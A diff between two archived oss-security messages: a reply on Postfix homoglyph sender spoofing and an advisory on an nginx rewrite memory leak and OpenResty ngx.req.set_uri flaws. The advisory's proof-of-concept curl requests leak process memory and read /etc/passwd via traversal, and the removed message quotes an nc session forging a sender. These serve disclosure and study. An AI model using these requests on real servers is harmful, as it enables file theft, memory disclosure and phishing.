@@ -1,98 +1,165 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/04/23/8
-Message-ID: <20200423151430.GA21258@openwall.com>
-Date: Thu, 23 Apr 2020 17:14:30 +0200
-From: Solar Designer <solar@...nwall.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/03/18/2
+Message-ID: <690ff1fc-7bef-63ff-8004-a45c873a24ea@securityvulns.ru>
+Date: Wed, 18 Mar 2020 17:43:58 +0300
+From: Vladimir Dubrovin <vlad@...urityvulns.ru>
 To: oss-security@...ts.openwall.com
-Cc: PromiseLabs Pentest Research <pentest@...miselabs.net>, Wietse Venema <wietse@...cupine.org>
-Subject: Re: spoofing of local email sender via a homoglyph attack
+Subject: Re: Insecure implementation of OpenResty ngx.req.set_uri + memory content leak in nginx.
 Content-Type: text/plain; charset=utf-8
 
-On Thu, Apr 23, 2020 at 05:32:15PM +0300, PromiseLabs Pentest Research wrote:
-> To follow up on your questions:
 
-Thanks!  Now this is specific.
+I've updated advisory at
+https://hackerone.com/reports/513236
+to reflect the fact some nginx configurations without openresty may be
+vulnerable to directory traversal, as demonstrated with configuration
+example (but mistakenely attributed to openresty).
 
-> The current configuration actually blocks any non-authorized requests as 
-> explained in the description. The use-case of this (from my perspective) 
-> is that it could be used to advance a social-engineer attack into 
-> tricking the recipients believing that they are getting an email from a 
-> high-level position at the company.
-> 
-> It's related to the from header.
-> 
-> Issuing a regular unauthenticated request, trying to send an email from 
-> john.doe, which is a high-level user at the company:
-> $ nc -v *** OMITTED *** 25
-> Connection to *** OMITTED *** 25 port [tcp/smtp] succeeded!
-> 220 *** OMITTED *** ESMTP Postfix
-> mail from: john.doe@...ver.com
-> 250 2.1.0 Ok
-> rcpt to: existing.user@...ver.com
-> 553 5.7.1 <john.doe@...ver.com>: Sender address rejected: not logged in
-> 
-> As you can see, the mail server rejects the request as the existing user 
-> hasn't authenticated himself.
+18.03.2020 16:10, Vladimir Dubrovin пишет:
+> OpenResty is LUA engine for nginx reverse proxy.
+>
+> Affected versions: tested on nginx-1.17.5 and openresty-1.15.8.2 on
+> ubuntu 18.04
+>
+> Two independent problems were identified in OpenResty and nginx,
+> potentially leading to different security vulnerabilities: Header
+> injection/CRLF injection, directory traversal/local file read,
+> restrictions bypass, memory content disclosure in some nginx + openresty
+> configurations:
+>
+> 1. There is a bug in nginx "rewrite" implementation. It can disclose the
+> fragment of the process memory with 301/302 HTTP reply if rewrite string
+> contains ASCII 0 character. Within nginx itself rewrite string is a
+> static configuration option, and is not supposed to be manipulated
+> externally.
+>
+> 2. OpenResty implements ngx.req.set_uri() via raw rewrite in nginx
+> without any additional filtering or normalization. If used with
+> untrusted input it can lead to CRLF/header injection, directory
+> traversal/local file read, restrictions bypass. Due to (1) it can also
+> lead to memory content disclosure.
+>
+>
+> Fix:
+> ==============
+>
+> As of now, there is no fix for ngx.req.set_uri(), this function must be considered as potentially unsafe.
+>
+> Recommendations:
+> ==============
+>
+> Avoid usage of ngx.req.set_uri() with untrusted input or implement strict input filtering.
+>
+>
+> Timeline:
+>
+> ==============
+>
+> 21.03.2019 - Memory content leak reported to Mail.Ru team via H1 by @maxarr in https://hackerone.com/reports/513236
+> 22.03.2019 - Memory content leak is mitigated on Mail.Ru side
+> 05.11.2019 - Problem additionally researched by Denis 'KPEBETKA' Denisov and Nikolay Ermishkin of Mail.Ru Security Team, root cause tracked to nginx+openresty.
+> 07.11.2019 - Reported to nginx team
+> 08.11.2019 - Acknowledged by nginx team
+> 13.12.2019 - nginx team reported back the issue is not tracked as a security bug in nginx, secure rewrite will not be provided by nginx API
+> 16.12.2019 - memory leak bug fixed in nginx master branch
+> https://hg.nginx.org/nginx/rev/02a539522be4
+> https://github.com/nginx/nginx/commit/a5895eb502747f396d3901a948834cd87d5fb0c3#diff-75916b11f3e6d45e713a6aa9c97cf315
+> 17.12.2019 - reported to OpenResty team
+> 17.12.2019 - acknowledged by OpenResty team
+> 18.03.2020 - disclosed
+>
+>
+> Details:
+>
+> ==============
+>
+> This configuration demonstrates memory content leak in nginx:
+>
+> Vulnerable config (^@ is a null byte)
+>
+> location ~ /memleak {
+>     rewrite ^.*$ "^@...fasdfasdfasdfasdfasdfasdfasdfasdfasdfasdasdf";
+> }
+>
+> location / {
+>     root html;
+>     index index.html index.htm;
+> }
+>
+> curl localhost:8337/memleak -vv
+> ...
+> Location: http://localhost:8337/WjWj
+> ...
+>
+> WjWj – is a random peace of memory, usual includes parts of other requests
+>
+> vulnerable code:
+>
+> https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L77
+>
+> last = ngx_http_map_uri_to_path(r, &path, &root, 0);
+>
+> Doesn't handle location with null byte properly
+>
+> https://github.com/nginx/nginx/blob/5a2ce3f4ee55eb8903aa9481deaaf402d5a2e805/src/http/ngx_http_core_module.c#L1846
+>
+> last = ngx_cpystrn(last, r->uri.data + alias, r->uri.len - alias + 1);
+>
+> Writes only null byte to last, not the whole r->uri.data
+>
+> https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L161
+>
+> if (!clcf->alias && clcf->root_lengths == NULL && r->args.len == 0) {
+>
+> It's important to get into this conditional branch to get memory leak
+>
+> https://github.com/nginx/nginx/blob/4bf4650f2f10f7bbacfe7a33da744f18951d416d/src/http/modules/ngx_http_static_module.c#L188
+>
+> r->headers_out.location->value.len = len;
+>
+> location length more than was really written, location ends with random
+> piece of memory (usually includes part of other HTTP requests).
+>
+> Example of configuration vulnerable to  memory leak with
+> https://github.com/openresty/lua-nginx-module:
+>
+> location ~ /memleak {
+>     rewrite_by_lua_block {
+>         ngx.req.read_body();
+>         local args, err = ngx.req.get_post_args();
+>         ngx.req.set_uri( args["url"], true );
+>     }
+> }
+>
+> location / {
+>     root html;
+>     index index.html index.htm;
+> }
+>
+> curl localhost:8337 -d "url=%00asdfasdfasdfasdfasdfasdfasdfasdf" -vv
+> ...
+> Location: http://localhost:8337/WjWj
+> ...
+>
+> Example of configuration vulnerable to directory traversal with
+> https://github.com/openresty/lua-nginx-module
+>
+> location ~ /rewrite {
+>     rewrite ^.*$ $arg_x;
+> }
+>
+> location / {
+>     root html;
+>     index index.html index.htm;
+> }
+>
+> curl localhost:8337/rewrite?x=/../../../../../../../etc/passwd
+> root:x:0:0:root:/root:/bin/bash
+> daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+> bin:x:2:2:bin:/bin:/usr/sbin/nologin
+> ...
+>
+>
+> -- Vladimir Dubrovin
+>
+>
 
-My guess is this works when the server is configured to support SMTP
-AUTH for potentially relaying mail from local users to other servers,
-but as you show under that configuration the authentication requirement
-applies even for messages intended for local users.  That's curious.
-
-I don't know whether that behavior is documented and expected, and
-whether it is considered a security feature or not.  I hope Wietse can
-weigh in on this.
-
-> However, issuing a request using a homoglyph character:
-> $ echo -ne "j\xce\xbfhn.doe@...ver.com" | xclip -selection clipboard
-> $ nc -v *** OMITTED ***  25
-> Connection to *** OMITTED ***  25 port [tcp/smtp] succeeded!
-> 220 *** OMITTED ***  ESMTP Postfix
-> mail from: j??hn.doe@...ver.com
-> 250 2.1.0 Ok
-> rcpt to: existing.user@...ver.com
-> 250 2.1.5 Ok
-> data
-> 354 End data with <CR><LF>.<CR><LF>
-> 
-> The victim would get an email thinking it's from the actual john.doe 
-> user.
-
-OK.  To me, the real unexpected issue here is not the possibility to
-spoof (in fact, it's unexpected to me that it wasn't possible in your
-first example), but rather the possibility to probe for valid usernames.
-That other aspect is more likely CVE-worthy, in my opinion.  There's
-precedent that such easy probing for usernames shouldn't work, and is
-getting CVEs against services where it does work.
-
-There's probably room for hardening here where in cases when SMTP AUTH
-is enforced for local users, mail from other local-looking addresses yet
-with non-existent usernames be rejected in exactly the same way (and
-with the same timings - tricky!) as mail from existing local usernames
-when SMTP AUTH is not attempted (like in your example).  There should
-also be no visible (and ideally no measurable) difference for existing
-and non-existent usernames when SMTP AUTH is attempted but fails.
-
-Alternatively, mail to local users could be accepted consistently
-regardless of whether the claimed sender username exists locally or not,
-thus without requiring authentication.  However, this would leave
-unfixed the username probing possibility on attempting to relay mail to
-external servers, where bypassing authentication is certainly not an
-option.  So overall that isn't a valid fix for the username probing.
-
-I assume the tests above are with postfix-2.10.1-7.el7.x86_64 as you had
-mentioned previously, and behavior could very well vary between builds.
-
-> Whether this is applicable for assigning a CVE it's up to you decide, 
-
-No, technically it's up to MITRE, and they've already assigned one - but
-I complain that they did so without sufficient detail on the issue.
-
-> the only actual risk here discovered so far is a social-engineering 
-> attack.
-
-And username probing.
-
-> >>> Use CVE-2020-12063.
-
-Alexander
